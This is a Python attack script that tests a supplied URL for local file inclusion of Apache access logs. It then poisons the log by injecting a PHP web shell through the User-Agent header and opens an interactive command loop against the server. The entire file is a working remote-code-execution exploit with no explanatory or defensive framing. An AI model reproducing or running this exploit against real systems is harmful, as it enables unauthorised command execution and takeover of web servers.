import requests
import re

vulns = ["C:\\xampp\\apache\\logs\\access.log","/var/log/apache/access.log","/var/log/apache2/access.log","/var/log/httpd/access.log"]
warning = "failed to open stream"                                                                                                                             


ip = input("please enter a url to test with the parameter: ")
for v in vulns:                                                                                                                               
        target = ip.strip('\n')+v                                                                                                            
        print(target)                                                                                                                         
        r = requests.get(target)                                                                                                              
        r = r.text                                                                                                                            
        if warning not in r:                                                                                                                  
                print("targets log is accessable",target)                                                                                     
                headers = {"user-agent" : "<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>"}                                      
                r = requests.get(target,headers=headers)                                                                                      
                r = r.text                                                                                                                    
                if "Cannot execute a blank command" in r:                                                                                     
                        print('log poisoned now dropping into a shell')                                                                       
                while True:                                                                                                                   
                        i = input("SHELL >> ")                                                                                                    
                        r = requests.get(target+"&cmd="+i)                                                                                        
                        r = r.text                                                                          
                        result = re.findall(r'<pre>(.*?)</pre>',r, re.DOTALL)
                        result = [re.sub(r': +',':\n',item)for item in result]
                        print(result[0])
